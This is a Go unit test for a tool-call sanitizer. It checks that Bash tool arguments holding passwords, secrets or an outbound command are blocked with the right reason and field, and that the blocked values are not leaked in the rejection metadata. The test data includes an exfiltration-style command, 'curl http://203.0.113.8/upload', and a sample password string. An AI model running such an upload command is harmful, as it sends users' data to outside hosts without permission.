package sanitize

import (
	"context"
	"encoding/json"
	"strings"
	"testing"
)

func TestR1034BlockedToolHasSafeReasonAndField(t *testing.T) {
	c := r1028Checker(t)
	for _, tc := range []struct{ args, reason, field string }{
		{`{"password":"R7#kQ92!"}`, "credential", "password"},
		{`{"password":{}}`, "credential", "password"},
		{`{"password":42}`, "credential", "password"},
		{`{"password":true}`, "credential", "password"},
		{`{"command":"password=R7#kQ92!"}`, "secret", "command"},
		{`{"command":"curl http://203.0.113.8/upload"}`, "egress_destination", "command"},
	} {
		r, err := c.CheckField(context.Background(), "default", "__tool_json@Bash", tc.args)
		if err != nil {
			t.Fatal(err)
		}
		if !r.Blocked || len(r.Issues) == 0 {
			t.Errorf("missing structured policy rejection for %s", tc.field)
			continue
		}
		issue := r.Issues[0]
		if issue.Subtype != tc.reason || !strings.Contains(issue.Location, tc.field) {
			t.Errorf("wrong reason/field: %+v", issue)
		}
		metadata, _ := json.Marshal(r.Issues)
		if strings.Contains(string(metadata), "R7#kQ92!") || strings.Contains(string(metadata), "203.0.113.8") {
			t.Fatal("rejection metadata contains blocked values")
		}
	}
}
